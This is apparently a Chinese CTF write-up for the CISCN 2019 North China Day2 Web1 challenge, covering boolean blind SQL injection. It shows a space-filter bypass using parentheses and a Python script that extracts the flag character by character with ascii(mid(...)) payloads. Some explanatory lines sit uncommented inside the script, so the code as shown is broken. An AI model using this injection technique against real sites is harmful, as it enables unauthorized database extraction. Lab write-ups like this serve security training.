# [CISCN 2019华北Day2]Web1
>知识点：bool盲注

随便输入几个发现有过滤
![alt text](image-1.png)
485长度的都是被过滤掉的
然后寻找注入点
![alt text](image-2.png)
![alt text](image-3.png)
发现是盲注
```bash
    利用()绕过空格过滤

    该payload最内层，mid表示从flag列的第一个字符开始截取长度为1的子字符串

    第二层ascii用于判断截取出来的子字符串的ascii码值是否为78（即N，flag格式为NSSCTF{}）

    若是，则页面回显id=1的页面
```
脚本:
```python
import requests #requests: 用于发送HTTP请求，目的是通过HTTP POST方法与目标网站交互。
import string #提供了一个包含所有可打印字符的字符串，用于生成可能的字符集。

def blind_injection(url):
	flag = ''
	strings = string.printable # 可打印字符集，包含字母、数字、标点符号等
	for num in range(1,60):#假设 flag 的长度不超过 60 个字符（num 表示字符位置）。
		for i in strings:#遍历所有可打印字符，尝试通过SQL查询来猜测对应位置的字符
			payload = '(select(ascii(mid(flag,{0},1))={1})from(flag))'.format(num,ord(i))
            #payload 是构造的SQL查询语句，使用 mid(flag,{0},1) 来获取 flag 在第 num 位置的字符。ascii(mid(flag,{0},1))={1} 是通过 ASCII 值来判断字符是否匹配。

{0} 是 num，即当前正在猜测的字符位置；{1} 是 ord(i)，即字符 i 的ASCII值。

例如，当 num=1 和 i='A' 时，构造的SQL负载可能是：(select(ascii(mid(flag,1,1))=65)from(flag))，65 是字母 'A' 的ASCII值
			post_data = {"id":payload}
			res = requests.post(url=url,data=post_data)
			if 'Hello' in res.text:
				flag += i
				print(flag)
			else:
				continue
	print(flag)


if __name__ == '__main__':
	url = 'http://node4.anna.nssctf.cn:28911/index.php'
	blind_injection(url)

```
